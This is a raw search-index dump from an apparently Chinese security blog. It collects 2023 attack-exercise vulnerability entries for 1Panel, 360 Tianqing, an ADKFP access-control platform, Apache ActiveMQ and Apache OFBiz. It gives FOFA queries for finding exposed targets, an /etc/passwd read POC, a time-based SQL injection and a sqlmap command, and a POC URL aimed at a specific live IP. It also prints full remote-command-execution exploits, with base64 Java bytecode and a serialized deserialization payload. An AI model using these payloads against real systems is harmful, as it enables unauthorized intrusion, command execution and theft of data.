","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:32:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["2023hw"],"content":"1Panel loadfile 后台文件读取漏洞 ","date":"2023-12-08","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"1Panel loadfile 后台文件读取漏洞","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件 ","date":"2023-12-08","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"1Panel loadfile 后台文件读取漏洞","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 1Panel ","date":"2023-12-08","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"1Panel loadfile 后台文件读取漏洞","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 “1Panel” ","date":"2023-12-08","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"1Panel loadfile 后台文件读取漏洞","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登陆页面 验证POC POST /api/v1/file/loadfile {\"paht\":\"/etc/passwd\"} ","date":"2023-12-08","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"1Panel loadfile 后台文件读取漏洞","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"360 新天擎终端安全管理系统存在信息泄露漏洞 GET /runtime/admin_log_confcache ","date":"2023-12-08","objectID":"/360-%E6%96%B0%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"360 新天擎终端安全管理系统存在信息泄露漏洞","uri":"/360-%E6%96%B0%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"360天擎 - 未授权与sql注入 ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:1:0","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"FOFA语法 title=\"360新天擎\" ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:2:0","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"鹰图 web.title=\"360新天擎\"\u0026\u0026 ip.isp=\"教育\" ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:3:0","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:4:0","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"未授权漏洞 路由后拼接/api/dbstat/gettablessize ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:4:1","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"sql注入漏洞 比较推荐的方式先测试是否存在数据库信息泄露，存在的话大概率存在SQL注入 路由后拼接/api/dp/rptsvcsyncpoint?ccid=1 {{Hostname}}/api/dp/rptsvcsyncpoint?ccid=1';SELECT PG_SLEEP(5)-- ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:4:2","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw漏洞"],"content":"sqlmap python .\\sqlmap.py –batch -dbs -u https://{{Hostname}}/api/dp/rptsvcsyncpoint?ccid=1 ","date":"2023-12-08","objectID":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/:5:0","tags":["2023hw漏洞"],"title":"360天擎 - 未授权与sql注入","uri":"/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"/adkfp/getCode\" ","date":"2023-12-08","objectID":"/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:0:0","tags":["2023hw"],"title":"ADKFP门禁出入口综合安防管理平台aDKManageUser文件存在未授权访问","uri":"/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw"],"content":"poc http://47.101.78.243/aDKManageUser/selectCll_2?roleId=2\u0026page=1\u0026limit=10 ","date":"2023-12-08","objectID":"/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":["2023hw"],"title":"ADKFP门禁出入口综合安防管理平台aDKManageUser文件存在未授权访问","uri":"/adkfp%E9%97%A8%E7%A6%81%E5%87%BA%E5%85%A5%E5%8F%A3%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0adkmanageuser%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":["2023hw漏洞"],"content":"Apache ActiveMQ远程命令执行漏洞 ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 5.18.0\u003c=Apache ActiveMQ\u003c5.18.3 5.17.0\u003c=Apache ActiveMQ\u003c5.17.6 5.16.0\u003c=Apache ActiveMQ\u003c5.16.7 5.15.0\u003c=Apache ActiveMQ\u003c5.15.15 ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"APACHE-ActiveMQ\" \u0026\u0026 port=\"61616\" ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"ActiveMqRCE 有回显 https://github.com/Hutt0n0/ActiveMqRCE ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"11.16号新增有回显的命令执行exp \u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:spring=\"http://camel.apache.org/schema/spring\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003ccontext:property-placeholder ignore-resource-not-found=\"false\" ignore-unresolvable=\"false\"/\u003e \u003cbean class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('CMDResponse',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQAtgoAKgBhCABiCABjCgBkAGUKAA0AZggAZwoADQBoCABpCABqCABrCABsBwBtBwBuCgAMAG8KAAwAcAoAcQByBwBzCgARAGEKAHQAdQoAEQB2CgARAHcKAA0AeAcAeQoAFwB6CgB7AHwIAH0KAH4AfwgARAoAfgCACgCBAIIKAIEAgwcAhAgAhQgASgcAhgoAIwCHCACICgANAIkKAIoAiwoAigCMBwCNBwCOAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MQ01EUmVzcG9uc2U7AQAEdGVzdAEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAVzdGFydAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAFWJ5dGVBcnJheU91dHB1dFN0cmVhbQEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAARyZWFkAQABSQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAZhQ2xhc3MBABFMamF2YS9sYW5nL0NsYXNzOwEABnRhcmdldAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAl0cmFuc3BvcnQBADBMb3JnL2FwYWNoZS9hY3RpdmVtcS90cmFuc3BvcnQvdGNwL1RjcFRyYW5zcG9ydDsBAAdhQ2xhc3MxAQALc29ja2V0ZmllbGQBAAZzb2NrZXQBABFMamF2YS9uZXQvU29ja2V0OwEADG91dHB1dFN0cmVhbQEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBAAdwcm9jZXNzAQADYXJnAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAbgcAjQcAbQcAjwcAkAcAcwcAeQEACkV4Y2VwdGlvbnMHAJEBAApTb3VyY2VGaWxlAQAQQ01EUmVzcG9uc2UuamF2YQwAKwAsAQAAAQAHb3MubmFtZQcAkgwAkwCUDACVAJYBAAd3aW5kb3dzDACXAJgBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nDAArAJkMADYAmgcAjwwAmwCcAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAJAMADwAnQwAngCfDACgAKEMACsAogEAE2phdmEvbGFuZy9FeGNlcHRpb24MAKMAlgcApAwApQCmAQAQamF2YS5sYW5nLlRocmVhZAcApwwAqACpDACqAKsHAKwMAK0ArgwArwCwAQAub3JnL2FwYWNoZS9hY3RpdmVtcS90cmFuc3BvcnQvdGNwL1RjcFRyYW5zcG9ydAEALm9yZy5hcGFjaGUuYWN0aXZlbXEudHJhbnNwb3J0LnRjcC5UY3BUcmFuc3BvcnQBAA9qYXZhL25ldC9Tb2NrZXQMALEAsgEAAQoMALMAoQcAtAwAngCiDAC1ACwBAAtDTURSZXNwb25zZQEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQADKClJAQAFd3JpdGUBAAQoSSlWAQALdG9CeXRlQXJyYXkBAAQoKVtCAQAFKFtCKVYBAApnZXRNZXNzYWdlAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAD2phdmEvbGFuZy9DbGFzcwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAVjbG9zZQAhACkAKgAAAAAAAgABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAcALwAAAAwAAQAAAAUAMAAxAAAAAQAyADMAAgAtAAAC5wAGAA0AAAD7EgJNEgJOEgI6BBIDuAAEtgAFEga2AAebAA0SCE4SCToEpwAKEgpOEgs6BLsADFkGvQANWQMtU1kEGQRTWQUrU7cADjoFGQW2AA86BhkGtgAQOge7ABFZtwASOggDNgkZB7YAE1k2CQKfAA0ZCBUJtgAUp//tuwANWRkItgAVt","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞回显复现 ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞脚本 https://github.com/Fw-fW-fw/activemq_Throwable https://github.com/sincere9/Apache-ActiveMQ-RCE https://github.com/X1r0z/ActiveMQ-RCE ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:7:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://paper.seebug.org/3058/ https://mp.weixin.qq.com/s/4n7vyeXLtim0tXcjnSWDAw ","date":"2023-12-08","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:8:0","tags":["2023hw漏洞"],"title":"Apache ActiveMQ远程命令执行漏洞","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070 2020年，为修复 CVE-2020-9496 增加权限校验，存在绕过。2021年，增加 Filter 用于拦截 XMLRPC 中的恶意请求，存在绕过。2023年四月，彻底删除xmlrpc handler 以避免同类型的漏洞产生尽管主分支在四月份已经移除了XML-RPC组件，但在Apache OFBiz的正式发布版本中，仅最新版本18.12.10彻底废除了XML-RPC功能。 流量分析: 攻击者利用这个漏洞时，会发送包含用户名和密码的 HTTP 请求到 XML-RPC 接口。在网络流量中，这可能表现为对 /webtools/control/xmlrpc 的异常访问请求。 异常请求内容: 利用 Filter 绕过机制的请求可能包含不寻常的 URI 结构，如使用分号或路径穿越技术(./)。 特定的错误日志: 在尝试进行反序列化攻击时，可能会在日志中观察到相关错误或异常信息，尤其是与XML-RPC 组件相关的。 ","date":"2023-12-08","objectID":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/:1:0","tags":["2023hw漏洞"],"title":"Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070","uri":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"Apache_OFBiz\" ","date":"2023-12-08","objectID":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/:2:0","tags":["2023hw漏洞"],"title":"Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070","uri":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/"},{"categories":["2023hw漏洞"],"content":"poc POST /webtools/control/xmlrpc;/?USERNAME=\u0026PASSWORD=s\u0026requirePasswordChange=Y HTTP/1.1 Host: ip:port Sec-Ch-Ua: \"Not=A?Brand\";v=\"99\", \"Chromium\";v=\"118\" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close cmd:ifconfig Content-Length: 8906 \u003c?xml version=\"1.0\"?\u003e \u003cmethodCall\u003e \u003cmethodName\u003eRCE\u003c/methodName\u003e \u003cparams\u003e \u003cparam\u003e \u003cvalue\u003e \u003cstruct\u003e \u003cmember\u003e \u003cname\u003eRCE\u003c/name\u003e \u003cvalue\u003e \u003cserializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"\u003e rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFK3K/rq+AAAAMwEFCgBFAIkKAIoAiwoAigCMCgAdAI0IAHoKABsAjgoAjwCQCgCPAJEHAHsKAIoAkggAkwoAIACUCACVCACWBwCXCACYCABYBwCZCgAbAJoIAJsIAHAHAJwLABYAnQsAFgCeCABnCACfBwCgCgAbAKEHAKIKAKMApAgApQcApggApwoAIACoCACpCQAlAKoHAKsKACUArAgArQoArgCvCgAgALAIALEIALIIALMIALQIALUHALYHALcKADAAuAoAMAC5CgC6ALsKAC8AvAgAvQoALwC+CgAvAL8KACAAwAgAwQoAGwDCCgAbAMMIAMQHAGQKABsAxQgAxgcAxwgAyAgAyQcAygcBAwcAzAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvVG9tY2F0Q21kRWNobzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAzQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANjbHMBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjUBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAltCAQAJcHJvY2Vzc29yAQASTGphdmEvbGFuZy9PYmplY3Q7AQADcmVxAQAEcmVzcAEAAWoBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEACnByb2Nlc3NvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABaQEABGZsYWcBAAFaAQAFZ3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAA1TdGFja01hcFRhYmxlBwDOBwDPBwDQBwCmBwCiBwCZBwCcBwBiBwDHBwDKAQAKU291cmNlRmlsZQEAElRvbWNhdENtZEVjaG8uamF2YQwARgBHBwDQDADRANIMANMA1AwA1QDWDADXANgHAM8MANkA2gwA2wDcDADdAN4BAARleGVjDADfAOABAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADhANYBAAZnbG9iYWwBAA5qYXZhL3V0aWwvTGlzdAwA4gDjDADbAOQBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwA5QDmAQAQamF2YS9sYW5nL09iamVjdAcA5wwA6A","date":"2023-12-08","objectID":"/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023